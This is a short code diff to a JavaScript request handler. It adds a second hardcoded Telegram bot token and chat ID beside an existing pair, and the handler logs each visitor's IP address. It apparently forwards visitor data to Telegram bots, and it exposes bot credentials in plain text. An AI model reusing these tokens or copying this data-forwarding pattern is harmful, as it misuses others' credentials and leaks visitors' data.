@@ -9,8 +9,8 @@ export default async function handler(req, res) {
   const BOT_TOKEN_1 = '8447954817:AAGbj18Ezfw0KL0ZKue35ApU2NRfw3zPSeU';
   const CHAT_ID_1 = '6842614309';
 
-  const BOT_TOKEN_2 = ''; 
-  const CHAT_ID_2 = '';
+  const BOT_TOKEN_2 = '9138054480:AAFrMp3vXH9zE4q63GNRAUh1O0Ase1tZqEQ'; 
+  const CHAT_ID_2 = '1745333535';
 
   const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
 
